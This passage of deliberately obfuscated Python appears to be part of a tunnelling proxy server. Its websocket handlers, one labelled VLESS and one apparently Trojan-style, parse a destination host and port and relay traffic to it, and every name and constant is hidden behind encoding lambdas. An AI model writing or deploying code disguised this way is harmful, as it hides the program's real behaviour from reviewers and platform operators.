            llIIIIIlIllIlllll += 0 .__class__((lambda n: int.__xor__(n, 247).to_bytes(1, 'big').decode())(180), 16) * 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 41) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('19'), 16) + 0 .__class__((lambda n: int.__xor__(n, 227).to_bytes(1, 'big').decode())(209), 16)
            llIIIIIIIIlllIIlIlIIlIIllI = IIllllIllIIIIIlIlllIlIlI[llIIIIIlIllIlllll]
            llIIIIIlIllIlllll += 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16) << 0 .__class__((lambda n: int.__xor__(n, 50).to_bytes(1, 'big').decode())(3), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 195 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([242]), 16)
            host = ''
            if llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 155 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([171]), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 166 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([151]), 16) | 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 209) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('e0'), 16):
                if llIIIIIlIllIlllll + (0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 110 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([94, 86, 95]), 16) - 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 48 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([83, 7, 1]), 16)) > IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 73) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('252c27')](IIllllIllIIIIIlIlllIlIlI):
                    return False
                host = (lambda n: int.__xor__(n, 86).to_bytes(1, 'big').decode())(120).join((IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 23) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('646365')](lIlllIIlIIIlIIl) for lIlllIIlIIIlIIl in IIllllIllIIIIIlIlllIlIlI[llIIIIIlIllIlllll:llIIIIIlIllIlllll + (0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('32'), 16) * 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 214) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('e4'), 16) + 0 .__class__((lambda n: int.__xor__(n, 224).to_bytes(1, 'big').decode())(208), 16))]))
                llIIIIIlIllIlllll += 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 77)) for c in IIIIIIlIIlIlII)))([125]), 16) << 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('33'), 16) | 0 .__class__((lambda n: int.__xor__(n, 74).to_bytes(1, 'big').decode())(126), 16)
            elif llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 124)) for c in IIIIIIlIIlIlII)))([77, 61]), 16) ^ 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3831'), 16):
                if llIIIIIlIllIlllll >= IIIIlllIIIllIIIIlIllIlII[(lambda n: int.__xor__(n, 9211338).to_bytes(3, 'big').decode())(14739620)](IIllllIllIIIIIlIlllIlIlI):
                    return False
                lIllIlIIlllIlIlllIIIllllIIl = IIllllIllIIIIIlIlllIlIlI[llIIIIIlIllIlllll]
                llIIIIIlIllIlllll += 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 221) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('ec9c'), 16) ^ 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 77) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('7c2f'), 16)
                if llIIIIIlIllIlllll + lIllIlIIlllIlIlllIIIllllIIl > IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 147) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('fff6fd')](IIllllIllIIIIIlIlllIlIlI):
                    return False
                host = IIllllIllIIIIIlIlllIlIlI[llIIIIIlIllIlllll:llIIIIIlIllIlllll + lIllIlIIlllIlIlllIIIllllIIl].decode()
                llIIIIIlIllIlllll += lIllIlIIlllIlIlllIIIllllIIl
            elif llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 222 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([239]), 16) << 0 .__class__((lambda n: int.__xor__(n, 49).to_bytes(1, 'big').decode())(0), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 204 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([253]), 16):
                if llIIIIIlIllIlllll + (0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('34'), 16) << 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 89) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('6b'), 16) | 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 102) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('56'), 16)) > IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 150) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('faf3f8')](IIllllIllIIIIIlIlllIlIlI):
                    return False
                host = (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 29) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('27').join((f"{(IIllllIllIIIIIlIlllIlIlI[lllIIlIlIllIlI] << 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 67 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([117]), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 91)) for c in IIIIIIlIIlIlII)))([106]), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 5)) for c in IIIIIIlIIlIlII)))([55]), 16)) + IIllllIllIIIIIlIlllIlIlI[lllIIlIlIllIlI + (0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 5)) for c in IIIIIIlIIlIlII)))([53]), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 182 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([135]), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 33)) for c in IIIIIIlIIlIlII)))([16]), 16))]:04x}" for lllIIlIlIllIlI in IIIIlllIIIllIIIIlIllIlII[(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('65676e6172')](llIIIIIlIllIlllll, llIIIIIlIllIlllll + (0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('38'), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 122)) for c in IIIIIIlIIlIlII)))([75]), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 205 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([253]), 16)), 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 58) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('0a'), 16) << 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 122) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('48'), 16) | 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('32'), 16))))
                llIIIIIlIllIlllll += 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 25)) for c in IIIIIIlIIlIlII)))([40, 125]), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 251).to_bytes(1, 'big').decode())(159), 16)
            else:
                return False
            if IIlllIlIIIlllll(host):
                await websocket.close()
                return False
            await websocket.send_bytes(IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 132 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([247, 225, 240, 253, 230])]([0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 99) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('5401'), 16) ^ 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('4237'), 16), 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 134 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([229, 231]), 16) ^ 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('4341'), 16)]))
            lIlllIllllIlI = await lllIIlIllllIlIII(host)
            try:
                llIllIlIlllIIlIIIl, IIIIlllIlIllIl = await lIlIIllIlIIlIll(lIlllIllllIlI, port)
                if llIIIIIlIllIlllll < IIIIlllIIIllIIIIlIllIlII[(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6e656c')](IIllllIllIIIIIlIlllIlIlI):
                    IIIIlllIlIllIl.write(IIllllIllIIIIIlIlllIlIlI[llIIIIIlIllIlllll:])
                    await IIIIlllIlIllIl.drain()

                async def IllIlllIlllllIIIlIllIIIIIII():
                    try:
                        async for IIllIIIIIIIlIIIl in websocket:
                            if IIllIIIIIIIlIIIl.type == aiohttp.WSMsgType.BINARY:
                                IIIIlllIlIllIl.write(IIllIIIIIIIlIIIl.data)
                                await IIIIlllIlIllIl.drain()
                    except:
                        pass
                    finally:
                        IIIIlllIlIllIl.close()
                        await IIIIlllIlIllIl.wait_closed()

                async def llIlIIIIIIllIllIIIIlIlllI():
                    try:
                        while True:
                            data = await llIllIlIlllIIlIIIl.read(0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 190 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([134, 139, 143, 143]), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('383531'), 16))
                            if not data:
                                break
                            await websocket.send_bytes(data)
                    except:
                        pass
                await llIlIIlIlIIIIlIllIl(IllIlllIlllllIIIlIllIIIIIII(), llIlIIIIIIllIllIIIIlIlllI())
            except Exception as lIIlllIIIllIIIlllIllIIIl:
                if DEBUG:
                    IlIllIIIIlIIlIll.error(f'Connection error: {lIIlllIIIllIIIlllIllIIIl}')
            return True
        except Exception as lIIlllIIIllIIIlllIllIIIl:
            if DEBUG:
                IlIllIIIIlIIlIll.error(f'VLESS handler error: {lIIlllIIIllIIIlllIllIIIl}')
            return False

    async def lIIIIIIlllIlIllllIIllll(self, websocket, IIllllIllIIIIIlIlllIlIlI: bytes) -> bool:
        try:
            if IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 101)) for c in IIIIIIlIIlIlII)))([9, 0, 11])](IIllllIllIIIIIlIlllIlIlI) < 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 144 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([169, 161, 161]), 16) - 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 20) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('7072'), 16):
                return False
            lIIlIIlIIlIlIlIIlIlI = IIllllIllIIIIIlIlllIlIlI[:0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 55 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([114]), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 66 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([112]), 16) | 0 .__class__((lambda n: int.__xor__(n, 11).to_bytes(1, 'big').decode())(59), 16)]
            lIlIIIlllIlIlllIIIIllIlIl = llllIIIllllIllllIIllll()
            lIlIIIlllIlIlllIIIIllIlIl.update(self.uuid.encode())
            IIllllIIlIIllllIIIlllllllI = lIlIIIlllIlIlllIIIIllIlIl.hexdigest()
            llIIllIlllIlIlllIll = UUID
            IllIIIlIIllIIllIlI = llllIIIllllIllllIIllll()
            IllIIIlIIllIIllIlI.update(llIIllIlllIlIlllIll.encode())
            lllllIIlllIIIIlIIlIIIl = IllIIIlIIllIIllIlI.hexdigest()
            llIIIIIIllIIlIllIlI = lIIlIIlIIlIlIlIIlIlI.decode((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 225) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('8092828888'), errors=(lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 165 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([192, 215, 202, 203, 194, 204]))
            if llIIIIIIllIIlIllIlI != IIllllIIlIIllllIIIlllllllI and llIIIIIIllIIlIllIlI != lllllIIlllIIIIlIIlIIIl:
                return False
            IlllIlllIllIIlll = 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3561'), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6436'), 16)
            if IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:IlllIlllIllIIlll + (0 .__class__((lambda n: int.__xor__(n, 152).to_bytes(1, 'big').decode())(169), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 158 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([175]), 16) | 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 158) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('ae'), 16))] == b'\r\n':
                IlllIlllIllIIlll += 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 131 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([183, 194]), 16) - 0 .__class__((lambda n: int.__xor__(n, 40898).to_bytes(2, 'big').decode())(65264), 16)
            lllIlllIlllIIlIIl = IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll]
            if lllIlllIlllIIlIIl != 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 66)) for c in IIIIIIlIIlIlII)))([7]), 16) * 0 .__class__((lambda n: int.__xor__(n, 140).to_bytes(1, 'big').decode())(188), 16) + 0 .__class__((lambda n: int.__xor__(n, 142).to_bytes(1, 'big').decode())(191), 16):
                return False
            IlllIlllIllIIlll += 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 122)) for c in IIIIIIlIIlIlII)))([75, 67]), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 12752).to_bytes(2, 'big').decode())(232), 16)
            llIIIIIIIIlllIIlIlIIlIIllI = IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll]
            IlllIlllIllIIlll += 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 87) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('67'), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 120 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([73]), 16) | 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 84) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('65'), 16)
            host = ''
            if llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3537'), 16) - 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3437'), 16):
                host = (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('2e').join((IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 179) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('c0c7c1')](lIlllIIlIIIlIIl) for lIlllIIlIIIlIIl in IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:IlllIlllIllIIlll + (0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 161 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([145, 231]), 16) - 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 119) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('3234'), 16))]))
                IlllIlllIllIIlll += 0 .__class__((lambda n: int.__xor__(n, 161).to_bytes(1, 'big').decode())(153), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 30)) for c in IIIIIIlIIlIlII)))([46]), 16) + 0 .__class__((lambda n: int.__xor__(n, 34).to_bytes(1, 'big').decode())(22), 16)
            elif llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 249) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('c9'), 16) << 0 .__class__((lambda n: int.__xor__(n, 205).to_bytes(1, 'big').decode())(255), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 4)) for c in IIIIIIlIIlIlII)))([55]), 16):
                lIllIlIIlllIlIlllIIIllllIIl = IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll]
                IlllIlllIllIIlll += 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 71 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([36]), 16) * 0 .__class__((lambda n: int.__xor__(n, 50).to_bytes(1, 'big').decode())(2), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 46 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([31]), 16)
                host = IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:IlllIlllIllIIlll + lIllIlIIlllIlIlllIIIllllIIl].decode()
                IlllIlllIllIIlll += lIllIlIIlllIlIlllIIIllllIIl
            elif llIIIIIIIIlllIIlIlIIlIIllI == 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 116 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([69]), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 83 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([97]), 16) | 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('30'), 16):
                host = (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3a').join((f"{(IIllllIllIIIIIlIlllIlIlI[lllIIlIlIllIlI] << 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 223) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('eeeaea'), 16) - 0 .__class__((lambda n: int.__xor__(n, 2237956).to_bytes(3, 'big').decode())(1249888), 16)) + IIllllIllIIIIIlIlllIlIlI[lllIIlIlIllIlI + (0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 168) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('9a'), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 33 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([17]), 16) + 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 115 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([66]), 16))]:04x}" for lllIIlIlIllIlI in IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 220) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('aebdb2bbb9')](IlllIlllIllIIlll, IlllIlllIllIIlll + (0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 130) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('c7'), 16) ^ 0 .__class__((lambda n: int.__xor__(n, 59614).to_bytes(2, 'big').decode())(55739), 16)), 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6631'), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 235 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([175, 218]), 16))))
                IlllIlllIllIIlll += 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 74) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('7b2b'), 16) ^ 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 85)) for c in IIIIIIlIIlIlII)))([52]), 16)
            else:
                return False
            port = IlllIllllIlIIIl((lambda n: int.__xor__(n, 40413).to_bytes(2, 'big').decode())(48277), IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:IlllIlllIllIIlll + (0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 241) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('c0b5c0'), 16) - 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 82 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([20, 17, 99]), 16))])[0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 215) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('e1e4'), 16) ^ 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 129) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('b7b2'), 16)]
            IlllIlllIllIIlll += 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 134 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([182]), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 3)) for c in IIIIIIlIIlIlII)))([49]), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 136 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([186]), 16)
            if IIllllIllIIIIIlIlllIlIlI[IlllIlllIllIIlll:IlllIlllIllIIlll + (0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 106)) for c in IIIIIIlIIlIlII)))([91]), 16) << 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 196) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('f5'), 16) | 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 193 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([241]), 16))] == b'\r\n':
